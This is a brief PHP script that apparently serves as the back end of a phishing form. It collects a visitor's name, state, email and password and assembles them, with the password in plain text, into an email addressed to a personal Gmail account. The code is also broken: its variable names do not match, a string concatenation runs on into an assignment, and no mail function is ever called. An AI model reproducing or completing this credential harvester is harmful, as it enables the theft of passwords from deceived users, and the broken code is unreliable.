<?php

if(isset($_POST["btn-send"]))
{
	$UserName = $_POST['name'];
	$UserState = $_POST['state'];
	$UserMail = $_POST['mail'];
	$UserPwd = $_POST['pwd'];

// 	$to = "timothymorin16@gmail.com";
}

$email_from = 'sample.com';

	$email_subject = "check form";

	$email_body = "Full Name: $name.\n".
						"State: $state.\n".
							"Mail: $mail.\n".
								"Password: $pwd.\n".
								

	$to = "linvertbella4love@gmail.com";

?>